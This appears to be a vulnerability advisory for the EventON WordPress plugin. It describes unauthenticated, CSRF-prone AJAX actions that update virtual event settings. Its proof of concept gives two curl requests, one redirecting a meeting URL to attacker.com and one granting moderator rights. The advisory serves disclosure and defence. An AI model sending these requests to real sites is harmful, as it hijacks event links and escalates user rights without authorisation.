## WordPress Plugin Vulnerabilities

# EventON (Free < 2.2.9, Premium < 4.5.9) - Unauthenticated Virtual Event Settings Update

### Description

The plugins do not have authorisation and CSRF in some AJAX actions, allowing unauthenticated users to update virtual events settings, such as meeting URL, moderator, access details etc

### Proof of Concept

To set the Meeting URL to https://attacker.com/ on the Virtual Event with ID 240:
curl -X POST --data "event\_id=240&\_vir\_url=https://attacker.com/" 'https://example.com/wp-admin/admin-ajax.php?action=eventon\_save\_virtual\_event\_settings'
To set the subscriber with user ID 5 as moderator of the Virtual Event with ID 240:
curl -X POST --data "eid=240&\_user\_role=subscriber&\_mod=5" 'https://example.com/wp-admin/admin-ajax.php?action=eventon\_save\_virtual\_mod\_settings'
v4.5.8 of the premium plugin added capability and CRSF checks, however the nonce verification is flawed, still allowing the issue to be exploited via CSRF
